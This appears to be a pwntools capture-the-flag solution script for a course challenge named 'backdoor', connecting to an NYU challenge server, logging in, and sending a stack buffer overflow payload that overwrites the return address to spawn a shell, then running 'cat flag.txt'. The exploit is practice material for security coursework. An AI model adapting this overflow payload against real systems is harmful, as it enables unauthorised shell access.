from __future__ import print_function
from pwn import *

debug = False

if debug:
    p = process("./backdoor")
else:
    # Connect and log in
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1339)
    p.recvuntil("):")
    p.sendline("krm504")

# Exploit
p.sendline("Kyle." + '\x00'*0x23 + p64(0x4006bb))

# Wait for shell
p.recvuntil("Kyle.")

# Get flag
p.sendline("cat flag.txt")
p.recvuntil("flag{")
flag = "flag{" + p.recvuntil("}")
print(flag)
